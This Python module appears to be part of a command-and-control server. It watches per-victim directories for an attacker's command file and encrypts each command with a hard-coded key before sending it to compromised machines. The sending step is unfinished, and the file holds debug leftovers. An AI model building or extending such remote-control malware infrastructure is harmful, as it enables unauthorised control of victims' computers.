"""Module designed to monitor commands issued by attacker to queue
"""
from threading import Timer
# from ..utils.consts import DEFAULT_DATA_DIR, DEFAULT_CMD_FILE
from utils.encrypt import Encrypter

import math
import os
import time

class CommandQueue():

    def __init__(self, directory, command_file):
        
        self.dir = directory
        self.command_file = command_file
        self.victim_dirs = []
        self.can_watch = False

    def start_listening(self):
        self.can_watch = True
        self._watch()

    def stop_listening(self):
        self.can_watch = False

    def _watch(self):
        """Watch subdirectories for commands to send to the victims
        """
        # if self.can_watch:
        #     Timer(3, self._watch).start()

        print('yeet')

        # Refresh victim dirs
        self.victim_dirs = self._get_victim_dirs()

        # Iterate over directories and read command file
        for dir in self.victim_dirs:
            if os.path.isfile(dir + '/input/' + self.command_file):
                with open(dir + '/input/' + self.command_file, 'r') as f:
                    commands = []
                    for line in f:
                        # Encrypt the commands
                        line = line.replace('\n', '')
                        commands.append(Encrypter(line, 'secret').encrypt())

                    # Prepare for transmission

                # os.remove(dir + '/input/' + self.command_file) # Done reading file

    def _get_victim_dirs(self):
        """Get corresponding victims that connected to the server
        """
        res = []
        print(self.dir)
        for victim in os.listdir(self.dir):
            if os.path.isdir(os.path.join(self.dir, victim)):
                res.append(os.path.join(self.dir, victim))

        return res
